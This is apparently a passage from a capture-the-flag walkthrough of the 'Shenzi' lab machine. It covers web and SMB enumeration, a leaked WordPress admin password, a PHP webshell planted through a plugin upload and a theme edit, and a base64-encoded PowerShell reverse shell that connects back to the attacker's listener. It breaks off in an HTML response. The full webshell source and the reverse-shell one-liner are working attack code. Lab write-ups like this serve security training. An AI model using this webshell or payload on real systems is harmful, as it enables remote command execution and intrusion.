+ http://192.168.168.55/dashboard/it/nul (CODE:403|SIZE:1046)                                                                                                          
+ http://192.168.168.55/dashboard/it/prn (CODE:403|SIZE:1046)                                                                                                          
                                                                                                                                                                       
---- Entering directory: http://192.168.168.55/dashboard/javascripts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                       
---- Entering directory: http://192.168.168.55/dashboard/jp/ ----
+ http://192.168.168.55/dashboard/jp/aux (CODE:403|SIZE:1046)                                                                                                          
+ http://192.168.168.55/dashboard/jp/com1 (CODE:403|SIZE:1046)                                                                                                         
+ http://192.168.168.55/dashboard/jp/com2 (CODE:403|SIZE:1046)                                                                                                         
+ http://192.168.168.55/dashboard/jp/com3 (CODE:403|SIZE:1046)                                                                                                         
+ http://192.168.168.55/dashboard/jp/con (CODE:403|SIZE:1046)                                                                                                          
+ http://192.168.168.55/dashboard/jp/index.html (CODE:200|SIZE:7953)                                                                                                   
+ http://192.168.168.55/dashboard/jp/lpt1 (CODE:403|SIZE:1046)                                                                                                         
+ http://192.168.168.55/dashboard/jp/lpt2 (CODE:403|SIZE:1046)                                                                                                         
+ http://192.168.168.55/dashboard/jp/nul (CODE:403|SIZE:1046)                                                                                                          
+ http://192.168.168.55/dashboard/jp/prn (CODE:403|SIZE:1046)                                                                                                          
^C> Testing: http://192.168.168.55/dashboard/jp/typo3conf                                                                                                              
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$
```

### DAVTest Fail

```bash
┌──(kali㉿kali)-[/var/lib/php/sessions]
└─$ davtest -url http://192.168.168.55                                                                                                                            127 ⨯
********************************************************
 Testing DAV connection
OPEN            FAIL:   http://192.168.168.55   Server response: 405 Method Not Allowed
                                                                                                                                                                        
┌──(kali㉿kali)-[/var/lib/php/sessions]
└─$ davtest -url http://192.168.168.55/dashboard
********************************************************
 Testing DAV connection
OPEN            FAIL:   http://192.168.168.55/dashboard Server response: 405 Method Not Allowed
                                                                                                                                                                        
┌──(kali㉿kali)-[/var/lib/php/sessions]
└─$
```

### Wordpress

![](Pasted%20image%2020220309201202.png)

## 443 - Web
Looks the same as port 80

## 445 - SMB

```
┌──(kali㉿kali)-[/tmp]
└─$ smbmap -u null -p "" -H 192.168.234.55 -P 445 -R 2>&1
[+] Guest session       IP: 192.168.234.55:445  Name: 192.168.234.55                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        IPC$                                                    READ ONLY       Remote IPC
        .\IPC$\*
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    InitShutdown
        fr--r--r--                4 Sun Dec 31 19:03:58 1600    lsass
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    ntsvcs
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    scerpc
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-28c-0
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-368-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    epmapper
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-1fc-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    LSM_API_service
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-3a0-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    eventlog
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-2cc-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    atsvc
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-510-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    spoolss
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-480-0
        fr--r--r--                4 Sun Dec 31 19:03:58 1600    wkssvc
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    trkwks
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    vgauth-service
        fr--r--r--                5 Sun Dec 31 19:03:58 1600    srvsvc
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-280-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    ROUTER
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    MsFteWds
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    SearchTextHarvester
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    W32TIME_ALT
        Shenzi                                                  READ ONLY
        .\Shenzi\*
        dr--r--r--                0 Fri May 29 09:26:51 2020    .
        dr--r--r--                0 Fri May 29 09:26:51 2020    ..
        fr--r--r--              894 Fri May 29 09:26:51 2020    passwords.txt
        fr--r--r--             7367 Fri May 29 09:26:51 2020    readme_en.txt
        fr--r--r--             3879 Fri May 29 09:26:51 2020    sess_klk75u2q4rpgfjs3785h6hpipp
        fr--r--r--              213 Fri May 29 09:26:51 2020    why.tmp
        fr--r--r--              178 Fri May 29 09:26:51 2020    xampp-control.ini
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 

```

### Reading Files

Download all files

```bash
┌──(kali㉿kali)-[/media/…/Offensive Security/Proving Ground Practices/Shenzi/smbfiles]
└─$ smbclient //192.168.168.55/Shenzi -N                                                              
lpcfg_do_global_parameter: WARNING: The "client use spnego" option is deprecated
lpcfg_do_global_parameter: WARNING: The "client ntlmv2 auth" option is deprecated
Try "help" to get a list of possible commands.
smb: \> prompt
smb: \> recurse
smb: \> mget *
getting file \passwords.txt of size 894 as passwords.txt (1.2 KiloBytes/sec) (average 1.2 KiloBytes/sec)
getting file \readme_en.txt of size 7367 as readme_en.txt (10.5 KiloBytes/sec) (average 5.8 KiloBytes/sec)
getting file \sess_klk75u2q4rpgfjs3785h6hpipp of size 3879 as sess_klk75u2q4rpgfjs3785h6hpipp (5.5 KiloBytes/sec) (average 5.7 KiloBytes/sec)
getting file \why.tmp of size 213 as why.tmp (0.3 KiloBytes/sec) (average 4.4 KiloBytes/sec)
getting file \xampp-control.ini of size 178 as xampp-control.ini (0.3 KiloBytes/sec) (average 3.5 KiloBytes/sec)
smb: \> 

```

```
┌──(kali㉿kali)-[/tmp]
└─$ smbclient //192.168.234.55/Shenzi -N                                                                                                                            1 ⨯
lpcfg_do_global_parameter: WARNING: The "client use spnego" option is deprecated
lpcfg_do_global_parameter: WARNING: The "client ntlmv2 auth" option is deprecated
Try "help" to get a list of possible commands.
smb: \> get *
NT_STATUS_OBJECT_NAME_INVALID opening remote file \*
smb: \> ls
  .                                   D        0  Thu May 28 11:45:09 2020
  ..                                  D        0  Thu May 28 11:45:09 2020
  passwords.txt                       A      894  Thu May 28 11:45:09 2020
  readme_en.txt                       A     7367  Thu May 28 11:45:09 2020
  sess_klk75u2q4rpgfjs3785h6hpipp      A     3879  Thu May 28 11:45:09 2020
  why.tmp                             A      213  Thu May 28 11:45:09 2020
  xampp-control.ini                   A      178  Thu May 28 11:45:09 2020

                12941823 blocks of size 4096. 6651051 blocks available
smb: \> get passwords.txt
getting file \passwords.txt of size 894 as passwords.txt (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)
smb: \> get readme_en.txt
getting file \readme_en.txt of size 7367 as readme_en.txt (7.0 KiloBytes/sec) (average 3.9 KiloBytes/sec)
smb: \> get why.tmp
getting file \why.tmp of size 213 as why.tmp (0.2 KiloBytes/sec) (average 2.7 KiloBytes/sec)
smb: \> get xampp-control.ini
getting file \xampp-control.ini of size 178 as xampp-control.ini (0.2 KiloBytes/sec) (average 2.1 KiloBytes/sec)
smb: \> get sess_klk75u2q4rpgfjs3785h6hpipp
getting file \sess_klk75u2q4rpgfjs3785h6hpipp of size 3879 as sess_klk75u2q4rpgfjs3785h6hpipp (3.7 KiloBytes/sec) (average 2.4 KiloBytes/sec)
smb: \> exit
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cat passwords.txt 
### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):

   User: root
   Password:
   (means no password!)

2) FileZilla FTP:

   [ You have to create a new user on the FileZilla Interface ] 

3) Mercury (not in the USB & lite version): 

   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   User: newuser  
   Password: wampp 

4) WEBDAV: 

   User: xampp-dav-unsecure
   Password: ppmax2011
   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
   For activation please comment out the httpd-dav.conf and
   following modules in the httpd.conf
   
   LoadModule dav_module modules/mod_dav.so
   LoadModule dav_fs_module modules/mod_dav_fs.so  
   
   Please do not forget to refresh the WEBDAV authentification (users and passwords).     

5) WordPress:

   User: admin
   Password: FeltHeadwallWight357
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cat readme_en.txt 
###### ApacheFriends XAMPP Version 7.4.6 ######

Important! PHP in this package needs the Microsoft Visual C++ 2017 Redistributable package from
http://www.microsoft.com/en-us/download/. Please ensure that the VC++ 2017 runtime
libraries are installed on your system.

  + Apache 2.4.43
  + MariaDB 10.4.11
  + PHP 7.4.6 (VC15 X86 64bit thread safe) + PEAR
  + phpMyAdmin 5.0.2
  + OpenSSL 1.1.0g
  + ADOdb 518a
  + Mercury Mail Transport System v4.63 (not included in the portable version)
  + FileZilla FTP Server 0.9.41 (not included in the portable version)
  + Webalizer 2.23-04 (not included in the portable version)
  + Strawberry Perl 5.16.3.1 Portable
  + Tomcat 7.0.103
  + XAMPP Control Panel Version 3.2.4.
  + XAMPP mailToDisk 1.0 (write emails via PHP on local disk in <xampp>\mailoutput. Activated in the php.ini as mail default.)

---------------------------------------------------------------

* System Requirements:

  + 64 MB RAM (RECOMMENDED)
  + 750 MB free fixed disk
  + Windows 7, Windows 8, Windows 10

---------------------------------------------------------------

* ATTENTION!!!!

For trouble with the mysql connection (via mysqlnd API in php) see also the startpage:
http://localhost/xampp/index.php

* QUICK INSTALLATION:

[NOTE: Unpack the package to your USB stick or a partition of your choice.
There it must be on the highest level like E:\ or W:\. It will
build E:\xampp or W:\xampp or something like this. Please do not use the "setup_xampp.bat" for an USB stick installation!]

Step 1: Unpack the package into a directory of your choice. Please start the
"setup_xampp.bat" and beginning the installation. Note: XAMPP makes no entries in the windows registry and no settings for the system variables.

Step 2: If installation ends successfully, start the Apache 2 with
"apache_start".bat", MySQL with "mysql_start".bat". Stop the MySQL Server with "mysql_stop.bat". For shutdown the Apache HTTPD, only close the Apache Command (CMD). Or use the fine XAMPP Control Panel with double-click on "xampp-control.exe"!

Step 3: Start your browser and type http://127.0.0.1 or http://localhost in the location bar. You should see our pre-made
start page with certain examples and test screens.

Step 4: PHP (with mod_php, as *.php), Perl by default with *.cgi, SSI with *.shtml are all located in => C:\xampp\htdocs\.
Examples:
- C:\xampp\htdocs\test.php => http://localhost/test.php
- C:\xampp\htdocs\myhome\test.php => http://localhost/myhome/test.php

Step 5: XAMPP UNINSTALL? Simply remove the "xampp" Directory.
But before please shutdown the apache and mysql.

---------------------------------------------------------------

* PHP MAIL FUNCTION:

There are three ways to work with the PHP Mail function.

1) With XAMPP mailToDisk every mail sending via the PHP mail() function will written in the <xampp>\mailoutput folder. MailToDisk is the default you do not have to change the php.ini. And please do not use mailToDisk for production!
2) With fakemail (sendmail.exe) you will send all mail() to your personal mail account. Therefore you have to edit the <xampp>\sendmail\sendmail.ini first. Then please activate fakemail (sendamil.exe) in the php.ini and comment out the mailToDisk line.
3) You can use a SMTP Server like the Mercury Mail Server alternate. Therefore comment out all sendmail_path lines in the php.ini. Now use the -> SMTP = localhost und -> smtp_port = 25 lines of course with your values in the php.ini.

Attention : If XAMPP is installed in a base directory with spaces (e.g. c:\program files\xampp) fakemail and mailtodisk do not work correctly. In this case please copy the sendmail or mailtodisk folder in your root folder (e.g. C:\sendmail) and use this for sendmail_path.

---------------------------------------------------------------

* PASSWORDS:

1) MySQL:

   User: root
   Password:
   (means no password!)

2) FileZilla FTP:

   [ You have to create a new user on the FileZilla Interface ]

3) Mercury:

   Postmaster: postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   TestUser: newuser
   Password: wampp

4) WEBDAV:

   User: xampp-dav-unsecure
   Password: ppmax2011

---------------------------------------------------------------

* ONLY FOR NT SYSTEMS! (NT4 | Windows 2000 | Windows XP):

- \xampp\apache\apache_installservice.bat
  ===> Install Apache 2 as service

- \xampp\apache\apache_uninstallservice.bat
  ===> Uninstall Apache 2 as service

- \xampp\mysql\mysql_installservice.bat
  ===> Install MySQL as service

- \xampp\mysql\mysql_uninstallservice.bat
  ===> Uninstall MySQL as service

==> After all un- / installations of services, better restart system!

----------------------------------------------------------------

A matter of security (A MUST READ!)

As mentioned before, XAMPP is not meant for production use but only for developers in a development environment. The way XAMPP is configured is to be open as possible and allowing the developer anything he/she wants. For development environments this is great but in a production environment it could be fatal. Here a list of missing security
in XAMPP:

- The MySQL administrator (root) has no password.
- The MySQL daemon is accessible via network.
- phpMyAdmin is accessible via network.
- Examples are accessible via network.

---------------------------------------------------------------

* MYSQL NOTES:

(1) The MySQL server can be started by double-clicking (executing) mysql_start.bat. This file can be found in the same folder you installed XAMPP in, most likely this will be C:\xampp\.
The exact path to this file is X:\xampp\mysql_start.bat, where "X" indicates the letter of the drive you unpacked XAMPP into. This batch file starts the MySQL server in console mode. The first intialization might take a few minutes.
Do not close the DOS window or you'll crash the server! To stop the server, please use mysql_stop.bat, which is located in the same directory. Or use the fine XAMPP Control Panel with double-click on "xampp-control.exe" for all these things!

(2) To use MySQL as Service for NT / 2000 / XP, simply copy the "my.ini" file to "C:\my.ini". Please note that this file has to be placed in C:\ (root), other locations are not permitted. Then execute the "mysql_installservice.bat" in the mysql folder.

(3) MySQL starts with standard values for the user id and the password. The preset user id is "root", the password is "" (= no password). To access MySQL via PHP with the preset values, you'll have to use the following syntax:

        mysql_connect("localhost", "root", "");

If you want to set a password for MySQL access, please use of MySQL Admin.
To set the passwort "secret" for the user "root", type the following:

        C:\xampp\mysql\bin\mysqladmin.exe -u root -p secret

After changing the password you'll have to reconfigure phpMyAdmin to use the new password, otherwise it won't be able to access the databases. To do that, open the file config.inc.php in \xampp\phpmyadmin\ and edit the following lines:

        $cfg['Servers'][$i]['user']            = 'root';   // MySQL User
        $cfg['Servers'][$i]['auth_type']       = 'http';   // HTTP authentification

So first the 'root' password is queried by the MySQL server, before phpMyAdmin may access.

---------------------------------------------------------------

                Have a lot of fun! | Viel Spaß! | Bonne Chance!
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cat why.tmp      
Warum dieses tmp-Verzeichnis?
Das braucht beispielweise PHP 
f�r seine Sessions-Verwaltung.
Also bitte nicht l�schen!

Why this tmp-Folder?
PHP need it for saving
the Sessions. 
So please do not delete it!                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cat xampp-control.ini 
[Common]
Edition=
Editor=notepad.exe
Browser=
Debug=0
Debuglevel=0
TomcatVisible=1
Language=English
[EnableModules]
Apache=1
MySQL=1
FileZilla=0
Mercury=0
Tomcat=0
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ file sess_klk75u2q4rpgfjs3785h6hpipp 
sess_klk75u2q4rpgfjs3785h6hpipp: ASCII text, with very long lines
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cat sess_klk75u2q4rpgfjs3785h6hpipp
 PMA_token |s:32:"522b574a21767922222439295b4b2975"; HMAC_secret |s:16:"67gK3D[0mYw<Mlpn";browser_access_time|a:2:{s:7:"default";i:1590593735;s:36:"d3907c4c-ecaf-f98a-85db-1bce60b6913a";i:1590596659;}relation|a:1:{i:1;a:41:{s:11:"PMA_VERSION";s:5:"5.0.2";s:7:"relwork";b:1;s:11:"displaywork";b:1;s:12:"bookmarkwork";b:1;s:7:"pdfwork";b:1;s:8:"commwork";b:1;s:8:"mimework";b:1;s:11:"historywork";b:1;s:10:"recentwork";b:1;s:12:"favoritework";b:1;s:11:"uiprefswork";b:1;s:12:"trackingwork";b:1;s:14:"userconfigwork";b:1;s:9:"menuswork";b:1;s:7:"navwork";b:1;s:17:"savedsearcheswork";b:1;s:18:"centralcolumnswork";b:1;s:20:"designersettingswork";b:1;s:19:"exporttemplateswork";b:1;s:8:"allworks";b:1;s:4:"user";s:4:"root";s:2:"db";s:10:"phpmyadmin";s:8:"bookmark";s:13:"pma__bookmark";s:15:"central_columns";s:20:"pma__central_columns";s:11:"column_info";s:16:"pma__column_info";s:17:"designer_settings";s:22:"pma__designer_settings";s:16:"export_templates";s:21:"pma__export_templates";s:8:"favorite";s:13:"pma__favorite";s:7:"history";s:12:"pma__history";s:16:"navigationhiding";s:21:"pma__navigationhiding";s:9:"pdf_pages";s:14:"pma__pdf_pages";s:6:"recent";s:11:"pma__recent";s:8:"relation";s:13:"pma__relation";s:13:"savedsearches";s:18:"pma__savedsearches";s:12:"table_coords";s:17:"pma__table_coords";s:10:"table_info";s:15:"pma__table_info";s:13:"table_uiprefs";s:18:"pma__table_uiprefs";s:8:"tracking";s:13:"pma__tracking";s:10:"userconfig";s:15:"pma__userconfig";s:10:"usergroups";s:15:"pma__usergroups";s:5:"users";s:10:"pma__users";}}two_factor_check|b:1;cache|a:3:{s:8:"server_1";a:4:{s:15:"userprefs_mtime";s:10:"1590593621";s:14:"userprefs_type";s:2:"db";s:12:"config_mtime";i:1584764260;s:9:"userprefs";a:1:{s:7:"Console";a:1:{s:4:"Mode";s:8:"collapse";}}}s:13:"server_1_root";a:16:{s:14:"mysql_cur_user";s:14:"root@localhost";s:12:"is_grantuser";b:1;s:13:"is_createuser";b:1;s:12:"is_superuser";b:1;s:17:"is_create_db_priv";b:1;s:14:"is_reload_priv";b:1;s:12:"db_to_create";s:0:"";s:30:"dbs_where_create_table_allowed";a:1:{i:0;s:1:"*";}s:11:"dbs_to_test";b:0;s:9:"proc_priv";b:1;s:10:"table_priv";b:1;s:8:"col_priv";b:1;s:7:"db_priv";b:1;s:11:"binary_logs";a:0:{}s:18:"menu-levels-server";a:13:{s:9:"databases";s:9:"Databases";s:3:"sql";s:3:"SQL";s:6:"status";s:6:"Status";s:6:"rights";s:5:"Users";s:6:"export";s:6:"Export";s:6:"import";s:6:"Import";s:8:"settings";s:8:"Settings";s:6:"binlog";s:10:"Binary log";s:11:"replication";s:11:"Replication";s:4:"vars";s:9:"Variables";s:7:"charset";s:8:"Charsets";s:7:"plugins";s:7:"Plugins";s:6:"engine";s:7:"Engines";}s:14:"menu-levels-db";a:14:{s:9:"structure";s:9:"Structure";s:3:"sql";s:3:"SQL";s:6:"search";s:6:"Search";s:5:"query";s:5:"Query";s:6:"export";s:6:"Export";s:6:"import";s:6:"Import";s:9:"operation";s:10:"Operations";s:10:"privileges";s:10:"Privileges";s:8:"routines";s:8:"Routines";s:6:"events";s:6:"Events";s:8:"triggers";s:8:"Triggers";s:8:"tracking";s:8:"Tracking";s:8:"designer";s:8:"Designer";s:15:"central_columns";s:15:"Central columns";}}s:13:"version_check";a:2:{s:8:"response";s:419:"{
    "date": "2020-03-21", 
    "version": "5.0.2", 
    "releases": [
        {
            "date": "2020-03-21", 
            "php_versions": ">=5.5,<8.0", 
            "version": "4.9.5", 
            "mysql_versions": ">=5.5"
        }, 
        {
            "date": "2020-03-21", 
            "php_versions": ">=7.1,<8.0", 
            "version": "5.0.2", 
            "mysql_versions": ">=5.5"
        }
    ]
}";s:9:"timestamp";i:1590593621;}}git_location|N;is_git_revision|b:0;tmpval|a:4:{s:14:"favoriteTables";a:1:{i:1;a:0:{}}s:12:"recentTables";a:1:{i:1;a:0:{}}s:18:"table_limit_offset";i:0;s:21:"table_limit_offset_db";s:8:"testsite";}ConfigFile1|a:2:{s:7:"Console";a:1:{s:4:"Mode";s:8:"collapse";}s:7:"Servers";a:1:{i:1;a:2:{s:7:"only_db";s:0:"";s:7:"hide_db";s:0:"";}}}debug|a:0:{}errors|a:0:{}                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 

```


## 3306 - MySQL
Cannot Access

```bash
┌──(kali㉿kali)-[/media/…/Offensive Security/Proving Ground Practices/Shenzi/smbfiles]
└─$ mysql -h 192.168.168.55 -u root                                                
ERROR 1130 (HY000): Host '192.168.49.168' is not allowed to connect to this MariaDB server
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Offensive Security/Proving Ground Practices/Shenzi/smbfiles]
└─$  
```

# Exploitation
## Credentials Leak

`admin:FeltHeadwallWight357`

Login with credentials in SMB share

![](Pasted%20image%2020220309201239.png)



## Test vuln plugin

Add vulnerable Plugin

![](Pasted%20image%2020220309201758.png)

```bash
┌──(kali㉿kali)-[/tmp]
└─$ ls -alR webshell_plugin 
webshell_plugin:
total 12
drwxr-xr-x  2 kali kali 4096 Mar  9 07:22 .
drwxrwxrwt 20 root root 4096 Mar  9 07:22 ..
-rw-r--r--  1 kali kali 2818 Mar  9 07:20 backdoor.php

┌──(kali㉿kali)-[/tmp]
└─$ head webshell_plugin/backdoor.php                                                                                                                               1 ⨯
<?php
// a simple php backdoor | coded by z0mbie [30.08.03] | http://freenet.am/~zombie \\

ob_implicit_flush();
if(isset($_REQUEST['f'])){
        $filename=$_REQUEST['f'];
        $file=fopen("$filename","rb");
        fpassthru($file);
        die;
}
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ zip -r webshell_plugin webshell_plugin
  adding: webshell_plugin/ (stored 0%)
  adding: webshell_plugin/backdoor.php (deflated 59%)
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

![](Pasted%20image%2020220309202406.png)

![](Pasted%20image%2020220309202509.png)

## Edit theme

```php
<?php
// a simple php backdoor | coded by z0mbie [30.08.03] | http://freenet.am/~zombie \\

ob_implicit_flush();
if(isset($_REQUEST['f'])){
        $filename=$_REQUEST['f'];
        $file=fopen("$filename","rb");
        fpassthru($file);
        die;
}
if(isset($_REQUEST['d'])){
        $d=$_REQUEST['d'];
        echo "<pre>";
        if ($handle = opendir("$d")) {
        echo "<h2>listing of $d</h2>";
                   while ($dir = readdir($handle)){ 
                       if (is_dir("$d/$dir")) echo "<a href='$PHP_SELF?d=$d/$dir'><font color=grey>";
                                                        else echo "<a href='$PHP_SELF?f=$d/$dir'><font color=black>";
                       echo "$dir\n"; 
                       echo "</font></a>";
                }
                       
        } else echo "opendir() failed";
        closedir($handle);
        die ("<hr>"); 
}
if(isset($_REQUEST['c'])){
        echo "<pre>";
        system($_REQUEST['c']);            
        die;
}
if(isset($_REQUEST['upload'])){

                if(!isset($_REQUEST['dir'])) die('hey,specify directory!');
                        else $dir=$_REQUEST['dir'];
                $fname=$HTTP_POST_FILES['file_name']['name'];
                if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fname))
                        die('file uploading error.');
}
if(isset($_REQUEST['mquery'])){

        $host=$_REQUEST['host'];
        $usr=$_REQUEST['usr'];
        $passwd=$_REQUEST['passwd'];
        $db=$_REQUEST['db'];
        $mquery=$_REQUEST['mquery'];
        mysql_connect("$host", "$usr", "$passwd") or
    die("Could not connect: " . mysql_error());
    mysql_select_db("$db");
    $result = mysql_query("$mquery");
        if($result!=FALSE) echo "<pre><h2>query was executed correctly</h2>\n";
    while ($row = mysql_fetch_array($result,MYSQL_ASSOC)) print_r($row);  
    mysql_free_result($result);
        die;
}
?>
<pre><form action="<?php echo $PHP_SELF; ?>" METHOD=GET >execute command: <input type="text" name="c"><input type="submit" value="go"><hr></form> 
<form enctype="multipart/form-data" action="<?php echo $PHP_SELF; ?>" method="post"><input type="hidden" name="MAX_FILE_SIZE" value="1000000000">
upload file:<input name="file_name" type="file">   to dir: <input type="text" name="dir">&nbsp;&nbsp;<input type="submit" name="upload" value="upload"></form>
<hr>to browse go to http://<?php echo $SERVER_NAME.$REQUEST_URI; ?>?d=[directory here]
<br>for example:
http://<?php echo $SERVER_NAME.$REQUEST_URI; ?>?d=/etc on *nix
or http://<?php echo $SERVER_NAME.$REQUEST_URI; ?>?d=c:/windows on win
<hr>execute mysql query:
<form action="<?php echo $PHP_SELF; ?>" METHOD=GET >
host:<input type="text" name="host"value="localhost">  user: <input type="text" name="usr" value=root> password: <input type="text" name="passwd">

database: <input type="text" name="db">  query: <input type="text" name="mquery"> <input type="submit" value="execute">
</form>

<!--    http://michaeldaw.org   2006    -->
```

![](Pasted%20image%2020220309205440.png)

![](Pasted%20image%2020220309205506.png)

![](Pasted%20image%2020220309205628.png)


## Reverse Shell

```powershell
┌──(kali㉿kali)-[/tmp]
└─$ curl "http://192.168.106.55/shenzi/a?c=powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQAOQAuADEAMAA2ACIALAAzADMAMAA2ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==" & nc -nlvp 3306
[1] 6331
listening on [any] 3306 ...
<!DOCTYPE html>

<html class="no-js" lang="en-US">

        <head>

                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0" >

                <link rel="profile" href="https://gmpg.org/xfn/11">

                <title>Page not found &#8211; Shenzi</title>
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Shenzi &raquo; Feed" href="http://192.168.106.55/shenzi/feed/" />
<link rel="alternate" type="application/rss+xml" title="Shenzi &raquo; Comments Feed" href="http://192.168.106.55/shenzi/comments/feed/" />
                <script>
                        window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/svg\/","svgExt":".svg","source":{"concatemoji":"http:\/\/192.168.106.55\/shenzi\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.4.1"}};
                        /*! This file is auto-generated */
                        !function(e,a,t){var r,n,o,i,p=a.createElement("canvas"),s=p.getContext&&p.getContext("2d");function c(e,t){var a=String.fromCharCode;s.clearRect(0,0,p.width,p.height),s.fillText(a.apply(this,e),0,0);var r=p.toDataURL();return s.clearRect(0,0,p.width,p.height),s.fillText(a.apply(this,t),0,0),r===p.toDataURL()}function l(e){if(!s||!s.fillText)return!1;switch(s.textBaseline="top",s.font="600 32px Arial",e){case"flag":return!c([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])&&(!c([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!c([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]));case"emoji":return!c([55357,56424,55356,57342,8205,55358,56605,8205,55357,56424,55356,57340],[55357,56424,55356,57342,8203,55358,56605,8203,55357,56424,55356,57340])}return!1}function d(e){var 